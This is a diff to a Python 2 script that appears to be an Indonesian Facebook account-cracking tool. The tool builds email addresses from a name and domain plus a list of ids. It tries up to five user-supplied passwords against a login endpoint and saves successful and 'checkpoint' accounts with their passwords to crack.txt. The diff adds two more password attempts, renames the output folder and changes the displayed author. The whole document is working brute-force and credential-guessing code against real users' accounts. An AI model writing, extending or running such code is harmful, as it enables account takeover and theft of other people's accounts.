@@ -141,11 +141,11 @@ def action():
     elif anggaxd == '1':
     	os.system('clear') 
         print logo
-        print ('[\033[1;93m•\033[1;97m] Nama   \033[1;91m: \033[1;92mAngga') 
-        print ('[\033[1;92m+\033[1;97m] Domain \033[1;91m: \033[1;92m@gmail.com @yahoo.com @hotmail.com') 
+        print ('[\033[1;93m•\033[1;97m] Nama   \033[1;91m: \033[1;97mputri.ayu') 
+        print ('[\033[1;92m+\033[1;97m] Domain \033[1;91m: \033[1;97m@gmail.com @yahoo.com @hotmail.com') 
         try:
-            k = raw_input('[\033[1;92m+\033[1;97m] Nama   \033[1;91m: \033[1;92m')
-            c = raw_input('[\033[1;93m?\033[1;97m] Domain \033[1;91m: \033[1;92m')
+            k = raw_input('[\033[1;92m+\033[1;97m] Nama   \033[1;91m: \033[1;97m')
+            c = raw_input('[\033[1;93m?\033[1;97m] Domain \033[1;91m: \033[1;97m')
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
@@ -160,9 +160,11 @@ def action():
     else:
         print '[!] Fill in correctly'
         action()  
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 1 \033[1;91m: \033[1;92m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 2 \033[1;91m: \033[1;92m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 3 \033[1;91m: \033[1;92m')
+    junee = raw_input('[\033[1;92m+\033[1;97m] Password 1 \033[1;91m: \033[1;97m')
+    junee = raw_input('[\033[1;92m+\033[1;97m] Password 2 \033[1;91m: \033[1;97m')
+    junee = raw_input('[\033[1;92m+\033[1;97m] Password 3 \033[1;91m: \033[1;97m')
+    junee = raw_input('[\033[1;92m+\033[1;97m] Password 4 \033[1;91m: \033[1;97m')
+    junee = raw_input('[\033[1;92m+\033[1;97m] Password 5 \033[1;91m: \033[1;97m')
     print "\033[1;97m--------------------------------------------------"
     xxx = str(len(id))
     psb ('[\033[1;93m+\033[1;97m] Total Numbers: '+xxx)
@@ -176,7 +178,7 @@ def action():
         global cpb,oks
         user = arg
         try:
-            os.mkdir('junee')
+            os.mkdir('anggaxd')
         except OSError:
             pass
         try:
@@ -185,15 +187,15 @@ def action():
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
-				okb = open('junee/crack.txt', 'a')
-				okb.write(k+c+user+pass1+'\n')
+				okb = open('anggaxd/crack.txt', 'a')
+				okb.write(k+c+user+ ' ◐ ' +pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
 					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
-					cps = open('junee/crack.txt', 'a')
-					cps.write(k+c+user+pass1+'\n')
+					cps = open('anggaxd/crack.txt', 'a')
+					cps.write(k+c+user+ ' ◐ ' +pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
 		
@@ -205,7 +207,7 @@ def action():
     print "\033[1;97m--------------------------------------------------"
     print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
     print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfully\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
-    print('[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : junee/crack.txt')
+    print('[\033[1;92m✓\033[1;97m] Cracking Email Has Been Saved : anggaxd/crack.txt')
     
     raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
     mail() 
